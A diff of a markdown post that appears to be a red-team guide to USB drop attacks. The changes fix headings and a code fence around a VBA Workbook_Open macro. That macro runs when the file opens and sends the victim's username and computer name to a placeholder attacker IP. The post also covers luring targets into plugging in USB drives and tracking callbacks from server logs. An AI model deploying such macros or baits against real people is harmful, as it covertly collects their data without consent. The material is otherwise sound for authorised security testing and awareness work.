@@ -97,7 +97,7 @@ After much deliberation and feedback, I’ve found that it’s best to break the
 **Side-Note:** Keep in mind that certain attacks do not follow this process such has utilizing a HID device, which will automatically run its programmed code upon plugin.
 {: .notice--info}  
 
-##External / Physical  
+## External / Physical  
 
 This portion is where you entice the target to pick up the USB by generating curiosity or lowering their suspicion to ultimately plug the device into a computer.  
 
@@ -198,7 +198,7 @@ File preparation
 - Select “ThisWorkbook” in the project pane (top-left)
 - Insert the following code in the main window
 
-.post-title { Sub Workbook_Open()
+```Sub Workbook_Open()
  Set IEapp = CreateObject("InternetExplorer.Application")
  
  Dim username
@@ -208,8 +208,7 @@ File preparation
  WebUrl = "http://<ATTACKING_IP>/<USB_DESCRIPTION>?user=" & username & "&computername=" & computername
  
  IEapp.navigate WebUrl
-
-End Sub }
+ ```
 
 **Side-Note:** Remember to edit line 7 to include your attacking IP address and a USB description (ex: green, front lobby, excelmacro_green).
 {: .notice--info}  
@@ -455,5 +454,5 @@ In your terminal type the following
 Once you have the web server stood up and functioning, it’s now merely a matter of creating files from whichever payload that you choose. I recommend naming your payloads with descriptive names. Once an access call comes from it (even if the file doesn’t exist) it will give you enough information to determine where it came from. For example, you could use “green_resume”. What this would tell you is that the green USB (that I know I dropped in the lobby) was plugged into a machine and they executed the Word document “Resume”. In the log, it would show the IP address, time, browser information, and resource requested.  
 ![USB Drop Callback](/assets/images/usb_drop_callback.jpg)  
 
-##Additional Resources  
+## Additional Resources  
 Great writerup by Elie Bursztein - [Does Dropping USB Drives Really Work](https://ly.tl/malusb)  
